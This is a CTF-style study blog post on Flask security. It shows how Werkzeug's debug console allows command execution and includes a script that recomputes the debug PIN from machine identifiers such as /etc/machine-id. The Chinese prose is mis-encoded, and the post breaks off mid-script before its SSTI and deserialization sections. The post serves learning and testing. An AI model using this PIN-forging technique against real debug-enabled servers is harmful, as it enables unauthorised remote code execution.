<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="keywords" content="Hexo Theme Keep"><meta name="description" content="Hexo Theme Keep"><meta name="author" content="Charmersix"><title>web10_pyweb+flaskssti+ååºåˆ—åŒ– | Charmersix&#39;s Blog</title><link rel="stylesheet" href="/css/style.css"><link rel="shortcut icon" href="/images/logo.png"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/fontawesome.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/regular.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/solid.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/font/css/brands.min.css"><script id="hexo-configurations">let KEEP=window.KEEP||{};KEEP.hexo_config={hostname:"charmersix.github.io",root:"/",language:"en",path:"search.json"},KEEP.theme_config={toc:{enable:!0,number:!0,expand_all:!0,init_open:!0},style:{primary_color:"#0066cc",logo:"/images/logo.png",favicon:"/images/logo.png",avatar:"/images/head.jpg",font_size:null,font_family:null,hover:{shadow:!0,scale:!0},first_screen:{enable:!0,header_transparent:!0,background_img:"/images/bg.svg",description:"Keep writing and Keep loving.",font_color:null,hitokoto:!0},scroll:{progress_bar:!1,percent:!0}},local_search:{enable:!0,preload:!0},code_copy:{},code_block:{tools:{enable:!0,style:"mac"},highlight_theme:"obsidian"},side_tools:{},pjax:{enable:!1},lazyload:{enable:!0},comment:{enable:!0,use:"waline",valine:{appid:null,appkey:null,server_urls:null,placeholder:null},gitalk:{github_id:null,github_admins:null,repository:null,client_id:null,client_secret:null,proxy:null},twikoo:{env_id:null,region:null,version:"1.6.8"},waline:{server_url:"https://waline-charmersix.vercel.app/",reaction:!0,version:2}},post:{author_label:{enable:!1,auto:!1,custom_label_list:["CTFer"]},word_count:{enable:!0,wordcount:!0,min2read:!0},img_align:"left",copyright_info:!1},version:"3.6.1"},KEEP.language_ago={second:"%s seconds ago",minute:"%s minutes ago",hour:"%s hours ago",day:"%s days ago",week:"%s weeks ago",month:"%s months ago",year:"%s years ago"},KEEP.language_code_block={copy:"Copy code",copied:"Copied",fold:"Fold code block",folded:"Folded"},KEEP.language_copy_copyright={copy:"Copy copyright info",copied:"Copied",title:"Original article title",author:"Original article author",link:"Original article link"}</script><meta name="generator" content="Hexo 5.4.2"></head><body><div class="progress-bar-container"></div><main class="page-container"><div class="page-main-content"><div class="page-main-content-top"><header class="header-wrapper"><div class="header-content"><div class="left"><a class="logo-image" href="/"><img src="/images/logo.png"> </a><a class="logo-title" href="/">Charmersix&#39;s Blog</a></div><div class="right"><div class="pc"><ul class="menu-list"><li class="menu-item"><a href="/">HOME</a></li><li class="menu-item"><a href="/archives">ARCHIVES</a></li><li class="menu-item"><a href="/tags">TAGS</a></li><li class="menu-item"><a href="/links">LINKS</a></li><li class="menu-item"><a href="/about">ABOUT</a></li><li class="menu-item search search-popup-trigger"><i class="fas fa-search"></i></li></ul></div><div class="mobile"><div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div><div class="icon-item menu-bar"><div class="menu-bar-middle"></div></div></div></div></div><div class="header-drawer"><ul class="drawer-menu-list"><li class="drawer-menu-item flex-center"><a href="/">HOME</a></li><li class="drawer-menu-item flex-center"><a href="/archives">ARCHIVES</a></li><li class="drawer-menu-item flex-center"><a href="/tags">TAGS</a></li><li class="drawer-menu-item flex-center"><a href="/links">LINKS</a></li><li class="drawer-menu-item flex-center"><a href="/about">ABOUT</a></li></ul></div><div class="window-mask"></div></header></div><div class="page-main-content-middle"><div class="main-content"><div class="fade-in-down-animation"><div class="post-page-container"><div class="article-content-container"><div class="article-title"><span class="title-hover-animation">web10_pyweb+flaskssti+ååºåˆ—åŒ–</span></div><div class="article-header"><div class="avatar"><img src="/images/head.jpg"></div><div class="info"><div class="author"><span class="name">Charmersix</span></div><div class="meta-info"><div class="article-meta-info"><span class="article-date article-meta-item"><i class="fa-regular fa-calendar-plus"></i>&nbsp; <span class="pc">2023-04-23 21:49:29</span> <span class="mobile">2023-04-23 21:49</span> </span><span class="article-update-date article-meta-item"><i class="fas fa-file-pen"></i>&nbsp; <span class="pc">2023-04-23 21:57:22</span> </span><span class="article-tags article-meta-item"><i class="fas fa-tags"></i>&nbsp;<ul><li><a href="/tags/Web/">Web</a>&nbsp;</li><li>| <a href="/tags/Study/">Study</a>&nbsp;</li><li>| <a href="/tags/Python/">Python</a>&nbsp;</li><li>| <a href="/tags/SSTI/">SSTI</a>&nbsp;</li><li>| <a href="/tags/Flask/">Flask</a>&nbsp;</li><li>| <a href="/tags/pickle/">pickle</a>&nbsp;</li><li>| <a href="/tags/py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">pyååºåˆ—åŒ–</a>&nbsp;</li></ul></span><span class="article-wordcount article-meta-item"><i class="fas fa-file-word"></i>&nbsp;<span>6.8k Words</span> </span><span class="article-min2read article-meta-item"><i class="fas fa-clock"></i>&nbsp;<span>31 Mins</span> </span><span class="article-pv article-meta-item"><i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span></span></div></div></div></div><div class="article-content keep-markdown-body"><h3 id="Flaskå­¦ä¹ "><a href="#Flaskå­¦ä¹ " class="headerlink" title="Flaskå­¦ä¹ "></a>Flaskå­¦ä¹ </h3><p>æåˆ°pythonå°±ç¦»ä¸å¼€flask, è¿™é‡Œæˆ‘ä»¬å…ˆå€Ÿç”¨flaskå†™ä¸€ä¸ª<code>helloworld</code></p><p>é¦–å…ˆç›´æ¥<code>pip install flask</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>) </span><span class="comment">#è¡¨ç¤ºé¦–é¡µç›®å½•</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;helloworld&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417191127312.png" alt="image-20230417191127312"></p><p>è¿™é‡Œæ˜¯<code>5000</code>ç«¯å£, ä¿®æ”¹ç«¯å£ä¹Ÿæ˜¯å¾ˆç®€å•, ç›´æ¥åœ¨<code>run()</code>é‡ŒåŠ <code>port=</code>å³å¯</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417191311119.png" alt="image-20230417191311119"></p><p>è¿™é‡Œå†ä»‹ç»ä¸¤ä¸ªå‚æ•°<code>host</code>å’Œ<code>debug</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;helloworld&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/hello&quot;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    passwd = request.form[<span class="string">&#x27;passwd&#x27;</span>]</span><br><span class="line">    result = check(username,passwd)</span><br><span class="line">    <span class="keyword">if</span> result:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome login&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">username,passwd</span>):</span><br><span class="line">    <span class="keyword">return</span> username==<span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> passwd==<span class="number">123456</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">80</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>æ·»åŠ <code>host=&quot;0.0.0.0&quot;</code>, æˆ‘ä»¬çš„ç½‘ç«™å°±å¯ä»¥è®©å…¶ä»–IPé€šè¿‡<code>http://10.187.81.36/</code>åœ°å€è®¿é—®</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202402104.png" alt="image-20230417202402104"></p><p>ç„¶å, å¦‚æœæˆ‘ä»¬è¿™é‡Œæ•…æ„å†™é”™ä¸€ä¸‹, å°±ä¼šå‡ºç°debugå†…å®¹<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202442641.png" alt="image-20230417202442641"></p><h3 id="Flask-PINç è®¡ç®—"><a href="#Flask-PINç è®¡ç®—" class="headerlink" title="Flask PINç è®¡ç®—"></a>Flask PINç è®¡ç®—</h3><p>debugå¼€å¯äº†å°±ä¼šå­˜åœ¨ä¸€ä¸ªæ¼æ´, è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°, å¼€å¯debugå, ä¼šè¿”å›ä¸€ä¸ª<code>PIN</code>ç <img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202617602.png" alt="image-20230417202617602"></p><p>è¿™é‡Œæˆ‘ä»¬è®¿é—®ä¸€ä¸‹<code>http://10.187.81.36/console</code>å°±ä¼šå¼¹å‡ºä¸€ä¸ªè®©æˆ‘ä»¬å¡«pinç çš„æ¡†, åªè¦æ­£ç¡®è¾“å…¥pinç , æˆ‘ä»¬å°±å¯ä»¥å®ç°è¿œç¨‹ä»»æ„å‘½ä»¤æ‰§è¡Œ, æ¯”å¦‚è¿™é‡Œæˆ‘ä»¬æŠŠäº‹å…ˆçŸ¥é“çš„pinç è¾“å…¥è¿›å»<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202753048.png" alt="image-20230417202753048"></p><p>å°±åˆ°äº†ä¸€ä¸ªpythonç¯å¢ƒ, æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>os</code>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417202925580.png" alt="image-20230417202925580"></p><p>ç„¶è€Œè¿™ä¸ªpinç åˆæ˜¯å¯ä»¥é€šè¿‡è®¡ç®—å¾—å‡ºçš„</p><p>è¿™é‡Œæˆ‘ä»¬çœ‹ä¸€ä¸‹pythonæºç , æ‰¾ä¸€ä¸‹pinç æ˜¯å¦‚ä½•è®¡ç®—å¾—å‡ºçš„, æºç è·¯å¾„<code>Python\Lib\site-packages\werkzeug\debug\__init__.py</code></p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417215705099.png" alt="image-20230417215705099"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°pinçš„è®¡ç®—é€»è¾‘<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417221214442.png" alt="image-20230417221214442"></p><p>è¿™é‡Œçš„è¿™ä¸ª<code>uuid.getnode()</code>å¯ä»¥é€šè¿‡æœ¬åœ°æ‰§è¡Œå¾—åˆ°</p><p><img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417221753243.png" alt="image-20230417221753243"></p><p>è¿™é‡Œæˆ‘ä»¬å¤šæ¬¡æ‰§è¡Œå¯ä»¥å‘ç°, å€¼æ˜¯ä¸å˜çš„, è¯´æ˜æ˜¯ä¸æˆ‘ä»¬æœºå™¨æœ‰å…³çš„å›ºå®šå€¼</p><p>ç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸‹<code>machine_id</code>çš„è®¡ç®—é€»è¾‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#æ‘˜è‡ªPython\Lib\site-packages\werkzeug\debug\__init__.py</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_machine_id</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">    <span class="keyword">global</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> _machine_id <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> _machine_id</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">        linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">        <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">        <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X, use ioreg to get the computer&#x27;s serial number.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">            <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">&quot;ioreg&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;2&quot;</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            match = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> match <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> winreg.OpenKey(</span><br><span class="line">                    winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    guid: t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]</span><br><span class="line">                    guid_type: <span class="built_in">int</span></span><br><span class="line">                    guid, guid_type = winreg.QueryValueEx(rk, <span class="string">&quot;MachineGuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> guid_type == winreg.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> guid.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> guid</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> _machine_id</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç»™å‡ºäº†Linux,MacOså’ŒWindowsä¸‰ä¸ªç³»ç»Ÿçš„è·å–æ–¹æ³•, æˆ‘ä»¬è¿™é‡Œå…ˆæ¥çœ‹ä¸€ä¸‹Windowsç³»ç»Ÿçš„</p><p>æˆ‘ä»¬<code>win+r</code>è¾“å…¥<code>regedit</code>ç„¶ååœ¨è·¯å¾„é‡Œæ‰“å¼€<code>è®¡ç®—æœº\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography</code>å°±èƒ½çœ‹åˆ°machine_idå°±æ˜¯å›¾ä¸­æˆ‘æ‰“ç çš„éƒ¨åˆ†<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417223444401.png" alt="image-20230417223444401"></p><p>ç„¶åæˆ‘ä»¬æ ¹æ®pinç è®¡ç®—é€»è¾‘, è‡ªå·±è®¡ç®—ä¸€ä¸‹æœ¬æœºçš„pinç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;Charmersix&quot;</span></span><br><span class="line">modname=<span class="string">&quot;flask.app&quot;</span></span><br><span class="line">appname=<span class="string">&quot;Flask&quot;</span></span><br><span class="line">moddir=<span class="string">&quot;E:\\Python\\lib\\site-packages\\flask\\app.py&quot;</span></span><br><span class="line">num=<span class="literal">None</span></span><br><span class="line">rv=<span class="literal">None</span></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        username,</span><br><span class="line">        modname,</span><br><span class="line">        appname,</span><br><span class="line">        moddir,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [<span class="string">&quot;35315514738897&quot;</span>, <span class="string">&quot;a*******-****-****-****-c**********6&quot;</span>]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x : x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°ç»“æœä¸ä¹‹å‰ä¸€æ ·<img lazyload alt="image" data-src="https://blog-1308152021.cos.ap-beijing.myqcloud.com/image-20230417230227019.png" alt="image-20230417230227019"></p><p>Linuxä¸‹å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥è®¡ç®—å¾—å‡ºçš„, å…·ä½“åŒºåˆ«å°±æ˜¯Linuxä¸‹éœ€è¦æ‹¿çš„æ–‡ä»¶ä¸ä¸€æ ·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_generate</span>() -&gt; t.<span class="type">Optional</span>[t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]]:</span><br><span class="line">       linux = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># machine-id is stable across boots, boot_id is not.</span></span><br><span class="line">       <span class="keyword">for</span> filename <span class="keyword">in</span> <span class="string">&quot;/etc/machine-id&quot;</span>, <span class="string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:</span><br><span class="line">           <span class="keyword">try</span>:</span><br><span class="line">               <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                   value = f.readline().strip()</span><br><span class="line">           <span class="keyword">except</span> OSError:</span><br><span class="line">               <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> value:</span><br><span class="line">               linux += value</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">       <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">       <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">       <span class="comment"># relatively stable across boots.</span></span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">           <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">               linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">       <span class="keyword">except</span> OSError:</span><br><span class="line">           <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> linux:</span><br><span class="line">           <span class="keyword">return</span> linux</span><br></pre></td></tr></table></figure><p>Linuxä¸‹å°±éœ€è¦è¯»<code>/etc/machine-id</code>å’Œ<code>/proc/sys/kernel/random/boot_id</code>å’Œ<code>/proc/self/cgroup</code>ä¸‰ä¸ªæ–‡ä»¶</p><p>è¿™é‡Œæ„Ÿè°¢ctfshowçš„å¤§å¸ˆå‚…æä¾›äº†ä¸€ä¸ªä¸€æŠŠæ¢­çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 